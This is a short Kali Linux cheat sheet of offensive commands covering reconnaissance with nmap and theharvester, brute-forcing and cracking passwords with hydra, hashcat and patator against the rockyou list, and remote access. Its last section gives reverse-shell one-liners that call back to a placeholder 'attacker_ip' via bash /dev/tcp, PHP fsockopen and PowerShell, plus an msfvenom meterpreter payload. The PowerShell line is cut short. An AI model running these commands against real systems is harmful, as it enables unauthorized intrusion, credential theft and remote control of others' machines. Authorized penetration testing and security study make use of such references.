# Kali Linux Cheat Sheet

## Information Gathering

* nmap -sS -A target.com - Stealth scan with OS & service detection

* whois target.com - Retrieve domain registration info

* theharvester -d target.com -b all - Gather emails & subdomains from public sources

* dnsenum target.com - Enumerate DNS records & subdomains

* dirb http://target.com/ - Brute-force directories

* nslookup target.com - Resolve domain to IP address

* whatweb http://target.com - Identify web technologies & server info

* recon-ng - Modular automated OSINT framework

## Password Attacks
* hydra -l admin -P rockyou.txt target.com http-get - Brute-force HTTP login

* john --wordlist=rockyou.txt hash.txt - Crack password hashes

* hashcat -m 0 hash.txt rockyou.txt - GPU-based password cracking

* cewl http://target.com -w wordlist.txt - Generate wordlist from a website

* crunch 6 10 abcdef1234 - Generate custom wordlists

* medusa -h target.com -u admin -P rockyou.txt -M http - Fast parallel brute-forcer

* patator ssh_login host=ip user=FILE0 password=FILE1 0=user.txt 1=pass.txt - Brute-force SSH login

## System Access & Reverse Shells

* nc -lvnp 4444 - Start Netcat listener

* bash -i >& /dev/tcp/attacker_ip/4444 0>&1 - Bash reverse shell

* powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);" - PowerShell reverse shell

* socat TCP4-LISTEN:4444,fork EXEC:/bin/bash - Socat listener for reverse shell

* php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");' - PHP reverse shell

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe - Generate reverse shell payload
